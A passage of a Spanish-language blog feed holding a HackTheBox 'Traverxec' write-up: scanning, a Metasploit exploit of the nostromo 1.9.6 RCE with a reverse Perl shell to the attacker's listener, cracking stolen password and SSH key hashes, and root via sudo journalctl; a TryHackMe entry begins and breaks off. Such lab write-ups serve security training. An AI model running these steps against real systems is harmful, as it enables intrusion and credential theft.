Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.080s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; aa:99:a8:16:68💿41:cc:f9:6c:84:01:c7:59:09:5c &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    nostromo 1.9.6
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: TRAVERXEC
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Sun Dec 29 23:13:00 2019 -- 1 IP address (1 host up) scanned in 19.96 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http---puerto-80&#34;&gt;HTTP - Puerto 80&lt;/h2&gt;
&lt;p&gt;Nos muestra una pagina web de una persona.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/traverxec/Screenshot_2019-12-29_23-21-55.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos que nos pudiesen servir.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/htb/traverxec# gobuster dir -u http://10.10.10.165/ -w /usr/share/wordlists/dirb/common.txt -x html,txt,php -t &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; -q
/css &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/empty.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/icons &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/img &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/js &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/lib &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/Readme.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;whatweb&#34;&gt;WHATWEB&lt;/h3&gt;
&lt;p&gt;Utilizamos esta herramienta para concoer que tipo de webserver esta corriendo en el puerto 80.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/traverxec/Screenshot_2019-12-29_23-25-46.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;nostromo---rce&#34;&gt;NOSTROMO - RCE&lt;/h2&gt;
&lt;p&gt;Buscamos si existe una vulnerabilidad para este webserver encontramose una y es del tipo RCE (&lt;code&gt;cve-2019-16278&lt;/code&gt;). Utilizamos metasploit para configurarlo, obtenemos una shell con el usuario &lt;strong&gt;www-data&lt;/strong&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;70
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msf5 &amp;gt; use exploit/multi/http/nostromo_code_exec
msf5 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/http/nostromo_code_exec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; show options 

Module options &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;exploit/multi/http/nostromo_code_exec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;,type:host:port&lt;span class=&#34;o&#34;&gt;][&lt;/span&gt;...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
   RHOSTS                    yes       The target host&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, range CIDR identifier, or hosts file with syntax &lt;span class=&#34;s1&#34;&gt;&amp;#39;file:&amp;lt;path&amp;gt;&amp;#39;&lt;/span&gt;
   RPORT    &lt;span class=&#34;m&#34;&gt;80&lt;/span&gt;               yes       The target port &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;TCP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
   SRVHOST  0.0.0.0          yes       The &lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; host to listen on. This must be an address on the &lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; machine or 0.0.0.0
   SRVPORT  &lt;span class=&#34;m&#34;&gt;8080&lt;/span&gt;             yes       The &lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; port to listen on.
   SSL      &lt;span class=&#34;nb&#34;&gt;false&lt;/span&gt;            no        Negotiate SSL/TLS &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; outgoing connections
   SSLCert                   no        Path to a custom SSL certificate &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;default is randomly generated&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
   URIPATH                   no        The URI to use &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; this exploit &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;default is random&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
   VHOST                     no        HTTP server virtual host


Payload options &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;cmd/unix/reverse_perl&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;an interface may be specified&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
   LPORT  &lt;span class=&#34;m&#34;&gt;4444&lt;/span&gt;             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;   Automatic &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Unix In-Memory&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;


msf5 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/http/nostromo_code_exec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; rhosts 10.10.10.165
&lt;span class=&#34;nv&#34;&gt;rhosts&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; 10.10.10.165
msf5 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/http/nostromo_code_exec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; lhost tun0
&lt;span class=&#34;nv&#34;&gt;lhost&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; 10.10.14.67
msf5 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/http/nostromo_code_exec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; show options 

Module options &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;exploit/multi/http/nostromo_code_exec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;,type:host:port&lt;span class=&#34;o&#34;&gt;][&lt;/span&gt;...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
   RHOSTS   10.10.10.165     yes       The target host&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, range CIDR identifier, or hosts file with syntax &lt;span class=&#34;s1&#34;&gt;&amp;#39;file:&amp;lt;path&amp;gt;&amp;#39;&lt;/span&gt;
   RPORT    &lt;span class=&#34;m&#34;&gt;80&lt;/span&gt;               yes       The target port &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;TCP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
   SRVHOST  0.0.0.0          yes       The &lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; host to listen on. This must be an address on the &lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; machine or 0.0.0.0
   SRVPORT  &lt;span class=&#34;m&#34;&gt;8080&lt;/span&gt;             yes       The &lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; port to listen on.
   SSL      &lt;span class=&#34;nb&#34;&gt;false&lt;/span&gt;            no        Negotiate SSL/TLS &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; outgoing connections
   SSLCert                   no        Path to a custom SSL certificate &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;default is randomly generated&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
   URIPATH                   no        The URI to use &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; this exploit &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;default is random&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
   VHOST                     no        HTTP server virtual host


Payload options &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;cmd/unix/reverse_perl&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.67      yes       The listen address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;an interface may be specified&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
   LPORT  &lt;span class=&#34;m&#34;&gt;4444&lt;/span&gt;             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;   Automatic &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Unix In-Memory&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;


msf5 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/http/nostromo_code_exec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; run
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/traverxec/Screenshot_2019-12-29_23-26-44.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;user---david&#34;&gt;USER - David&lt;/h2&gt;
&lt;p&gt;Realizamos una enumeracion de los directorios en la maquina encontramos un archivo (&lt;code&gt;.httpasswd&lt;/code&gt;) en el directorio de nostromo que contiene una contraseña encriptada en md5crypt.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/traverxec/Screenshot_2019-12-29_23-38-02.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Desencriptamos la contraseña con john pero al intentar utilizarla en ssh no funcionó.&lt;/p&gt;
&lt;p&gt;John:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/traverxec/Screenshot_2019-12-30_00-42-15.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;SSH:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/traverxec/Screenshot_2019-12-30_00-42-36.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En el mismo directorio encontramos un archivo de configuracion de nostromo en el que esta definido ciertos parametros para el webserver.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;nhttpd.conf&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/traverxec/Screenshot_2019-12-30_00-44-18.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Segun la documentacion, los parametros definidos con &lt;code&gt;homedirs&lt;/code&gt; son las carpetas de usuarios que pueden ser accedidos a traves de HTTP utilizando &lt;code&gt;~nombreUsuario&lt;/code&gt; en la url.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# HOMEDIRS [OPTIONAL]&lt;/span&gt;

homedirs		/home
homedirs_public		public_www
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/traverxec/Screenshot_2019-12-30_00-45-26.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En el caso de nuestra maquina podemos acceder a la carpeta del usuario david con &lt;strong&gt;~david&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/traverxec/Screenshot_2019-12-30_00-47-41.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Como podemos observar podemos acceder a la carpeta del usuario david, más no por medio de una shell ya que no tenemos los permisos suficientes, de igual forma existe otro parametro &lt;strong&gt;homedirs_public&lt;/strong&gt; esta carpeta definida esta dentro de la carpeta de homedirs definida anteriormente, por lo que podemos acceder a esta desde nuestro navegador y desde nuestra shell.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/traverxec/Screenshot_2019-12-30_00-51-21.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Vemos que hay un backup de ssh, accedemos desde nuestro navegador a la carpeta &lt;code&gt;/~david/protected-file-area/&lt;/code&gt;, nos pedira una contraseña y un usuario, utilizamos las credenciales crackeadas anteriormente y podemos ver y descargar el archivo.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/traverxec/Screenshot_2019-12-30_00-53-41.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos la clave privada para iniciar sesion, pero esta, esta protegida encriptada, utilizamos ssh2john para obtener el hash y crackear la frase, luego de esto usamos la frase con el usuario david y la llave privada atraves de ssh y obtenemos nuestra flag &lt;strong&gt;user.txt&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/traverxec/Screenshot_2019-12-30_01-07-04.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Dentro de la carpeta de David encontramos un archivo bash que ejecuta ciertos binarios o comandos del sistema, pero vemos que journalctl es ejecutado junto a sudo y cat. Intentamos enumerar los ficheros que pueden ser ejecutados junto a sudo con el usuario David pero no tenemosla contraseña de este.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; /usr/bin/cat
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Para obtener una shell, ejecutamos sudo con journalctl tal y como se ejecuta en el archivo bash, luego de eso escribimos &lt;code&gt;!/bin/sh&lt;/code&gt; y obtenemos shell con usuario root y nuestra flag &lt;strong&gt;root.txt&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/traverxec/Screenshot_2019-12-30_01-40-51.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Segun &lt;a href=&#34;https://gtfobins.github.io/gtfobins/journalctl/&#34;&gt;&lt;strong&gt;Gtfobins&lt;/strong&gt;&lt;/a&gt; al ejecutar journalctl, este, ejecuta lo que parece ser less, por lo que pudimos abrir una shell con el comando &lt;code&gt;!/bin/sh&lt;/code&gt;.&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/traverxec/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/traverxec/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Jack-of-All-Trades</title>
        <link>https://sckull.github.io/posts/jackofalltrades/</link>
        <pubDate>Wed, 08 Apr 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Wed, 08 Apr 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/jackofalltrades/</guid>
        <description>Jack-of-All-Trades es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Jack-of-All-Trades es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/jackofalltrades/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Jack-of-All-Trades&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;Boot-to-root originally designed for Securi-Tay 2020&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;400&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/MuirlandOracle&#34;&gt;MuirlandOracle&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto ssh (80) y el puerto http (22) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
